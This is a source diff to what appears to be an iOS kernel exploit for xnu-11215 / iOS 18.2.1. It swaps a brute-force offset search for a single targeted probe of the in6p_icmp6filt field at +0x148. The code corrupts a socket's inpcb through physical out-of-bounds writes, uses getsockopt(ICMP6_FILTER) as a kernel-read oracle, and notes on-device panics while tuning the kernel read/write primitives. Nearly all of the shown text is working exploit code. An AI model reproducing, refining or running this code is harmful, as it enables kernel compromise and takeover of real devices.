@@ -115,10 +115,10 @@ static int socketCsi = -1;
 // zone panic, observed twice), so all release paths skip these.
 static NSMutableSet *leakedPorts;
 static uint64_t gControlSocketAddr = 0, gRwSocketAddr = 0;
-// Real inpcb offset of in6p_icmp6filt on THIS kernel. OFFSET_ICMP6FILT (0x138)
-// is NOT it (proved on-device: filt(+0x138)=0 everywhere yet every getsockopt
-// succeeds), so find_and_corrupt_socket() brute-forces it per run and stores
-// it here for later kwrite/restore paths.
+// Real inpcb offset of in6p_icmp6filt on THIS kernel. OFFSET_ICMP6FILT (0x148)
+// was verified on-device (dump_inp_*.bin show a valid heap ptr at +0x148, and
+// clearsword_utils.c uses 0x148 for iOS 18+); find_and_corrupt_socket() probes
+// exactly that slot and stores it here for later kwrite/restore paths.
 static uint64_t gIcmp6FiltOffset = OFFSET_ICMP6FILT;
 static uint8_t controlData[0x20];
 static volatile uint8_t goSync = 0, raceSync = 0, freeThreadStart = 0;
@@ -572,7 +572,7 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
             uint64_t hSock = *(uint64_t*)((uintptr_t)rBuf + hpso + 0x40);
             uint64_t hFilt = *(uint64_t*)((uintptr_t)rBuf + hpso + OFFSET_ICMP6FILT);
             if ((gNameHits & 0xF) == 1) {
-                printf("[dbg] hit pso=0x%llx gencnt(+0x78)=0x%llx filt(+0x138)=0x%llx next(+0x28)=0x%llx sock(+0x40)=0x%llx\n",
+                printf("[dbg] hit pso=0x%llx gencnt(+0x78)=0x%llx filt(+0x148)=0x%llx next(+0x28)=0x%llx sock(+0x40)=0x%llx\n",
                     (unsigned long long)hpso, (unsigned long long)htg,
                     (unsigned long long)hFilt, (unsigned long long)hNext,
                     (unsigned long long)hSock);
@@ -641,23 +641,24 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
     printf("[+] PCB B expected rw gencnt: 0x%llx\n",
            [(NSNumber*)socketPcbIds[csi + 1] unsignedLongLongValue]);
 
-    // ==== BRUTE-FORCE REAL in6p_icmp6filt OFFSET ====
-    // OFFSET_ICMP6FILT (0x138) is proven WRONG on this kernel (xnu-11215 /
-    // iOS 18.2.1): every slot dump shows filt(+0x138)=0 on every inpcb, yet
-    // every socket's getsockopt(ICMP6_FILTER) succeeds with the all-ones fresh
-    // filter -- impossible if in6p_icmp6filt were really at +0x138 (a NULL
-    // there would make icmp6_ctloutput return EINVAL). So the real offset is
-    // discovered empirically, per run.
-    //
-    // Oracle: for each candidate offset `off`, plant control's field at pso+off
-    // to `inpNext + 0x78` (the rw owner's inp_gencnt), then getsockopt(control).
-    //   - real slot : icmp6_ctloutput copies 32 bytes from inpNext+0x78 -> gd0
-    //                 == rw owner's gencnt (a value we sprayed, so in gset)
-    //   - wrong slot: control's real filter is untouched -> gd0 is never a
-    //                 sprayed gencnt (EINVAL if NULL, else the all-ones filter)
-    // Each wrong candidate is restored to pristine before the next probe. The
-    // winning gd0 is ALSO rw's gencnt, so it identifies rwIdx directly (no
-    // full socket scan needed).
+    // ==== CONFIRMED in6p_icmp6filt OFFSET ====
+    // The real offset is +0x148 (NOT 0x138) on this kernel (xnu-11215 /
+    // iOS 18.2.1 / A14). Confirmed three ways:
+    //   1. Every live inpcb dump (dump_inp_*.bin, from both the 0x138-era run
+    //      and the current build) shows a valid per-socket kernel-heap pointer
+    //      at +0x148 while +0x138 is always 0.
+    //   2. clearsword_utils.c: inpcb_icmp6filt = 0x148 for iOS 18+.
+    //   3. icmp6_ctloutput: a NULL filter at the real slot would return EINVAL,
+    //      but every socket's getsockopt(ICMP6_FILTER) succeeds with the
+    //      all-ones fresh filter.
+    // We probe ONLY 0x148 with a single targeted plant + getsockopt oracle:
+    //   plant control's field at pso+0x148 -> inpNext+0x78 (rw's inp_gencnt),
+    //   then getsockopt(control) must copy 32 bytes from there -> gd0 == rw's
+    //   gencnt (a value we sprayed, so in gset). A wide 0x88..0x208 brute-force
+    //   is NOT used: planting kernel-heap pointers into arbitrary live inpcb
+    //   fields corrupts pointers that concurrent network paths dereference ->
+    //   kernel data abort (observed on-device panic "Kernel data abort ... far:
+    //   0x00000fdf880cfa29").
     uint8_t *pristine = malloc(OOB_SIZE);
     memcpy(pristine, rBuf, OOB_SIZE);
     NSMutableSet *gset = [NSMutableSet setWithArray:(NSMutableArray*)socketPcbIds];
@@ -667,45 +668,40 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
     printf("[dbg] control fd=%d\n", sock);
     fflush(stdout);
 
-    uint64_t filtOff = 0;
+    uint64_t filtOff = OFFSET_ICMP6FILT; // 0x148 confirmed on this kernel
     uint64_t rwGencnt = 0;
-    for (uint64_t off = 0x88; off <= 0x208 && filtOff == 0; off += 8) {
-        memcpy(wBuf, pristine, OOB_SIZE);
-        *(uint64_t*)((uintptr_t)wBuf + pso + off) = inpNext + 0x78;
-        while (1) {
-            phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, wBuf);
-            phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
-            if (*(uint64_t*)((uintptr_t)rBuf + pso + off) == inpNext + 0x78) break;
-        }
-        uint8_t ogd[0x20]; socklen_t osl = 0x20;
-        int ogso = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, ogd, &osl);
-        uint64_t ogd0 = *(uint64_t*)ogd;
-        printf("[dbg] off brute 0x%llx: gso=%d gd0=0x%llx\n",
-            (unsigned long long)off, ogso, (unsigned long long)ogd0);
+    memcpy(wBuf, pristine, OOB_SIZE);
+    *(uint64_t*)((uintptr_t)wBuf + pso + filtOff) = inpNext + 0x78;
+    while (1) {
+        phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, wBuf);
+        phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
+        if (*(uint64_t*)((uintptr_t)rBuf + pso + filtOff) == inpNext + 0x78) break;
+    }
+    uint8_t ogd[0x20]; socklen_t osl = 0x20;
+    int ogso = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, ogd, &osl);
+    uint64_t ogd0 = *(uint64_t*)ogd;
+    printf("[dbg] offset probe +0x%llx: gso=%d gd0=0x%llx\n",
+        (unsigned long long)filtOff, ogso, (unsigned long long)ogd0);
+    fflush(stdout);
+    if (!(ogso == 0 && [gset containsObject:@(ogd0)])) {
+        printf("[-] offset probe +0x%llx did not return a sprayed gencnt (gso=%d gd0=0x%llx)\n",
+            (unsigned long long)filtOff, ogso, (unsigned long long)ogd0);
         fflush(stdout);
-        if (ogso == 0 && [gset containsObject:@(ogd0)]) {
-            filtOff = off;
-            rwGencnt = ogd0;
-            printf("[+] real in6p_icmp6filt offset found: +0x%llx (rw gencnt 0x%llx)\n",
-                (unsigned long long)off, (unsigned long long)ogd0);
-            fflush(stdout);
-            break;
-        }
         for (int rtry = 0; rtry < 20; rtry++) {
             phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, pristine);
             phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
-            if (*(uint64_t*)((uintptr_t)rBuf + pso + off) ==
-                *(uint64_t*)((uintptr_t)pristine + pso + off)) break;
+            if (*(uint64_t*)((uintptr_t)rBuf + pso + filtOff) ==
+                *(uint64_t*)((uintptr_t)pristine + pso + filtOff)) break;
         }
-    }
-    if (filtOff == 0) {
-        printf("[-] offset brute force: no in6p_icmp6filt slot returned a sprayed gencnt (0x88..0x208)\n");
-        fflush(stdout);
         close(sock);
         free(pristine);
         socketCsi = -1;
         return -1;
     }
+    rwGencnt = ogd0;
+    printf("[+] real in6p_icmp6filt offset confirmed: +0x%llx (rw gencnt 0x%llx)\n",
+        (unsigned long long)filtOff, (unsigned long long)ogd0);
+    fflush(stdout);
     gIcmp6FiltOffset = filtOff;
     int rwIdx = (int)[(NSMutableArray*)socketPcbIds indexOfObject:@(rwGencnt)];
     if (rwIdx < 0) {
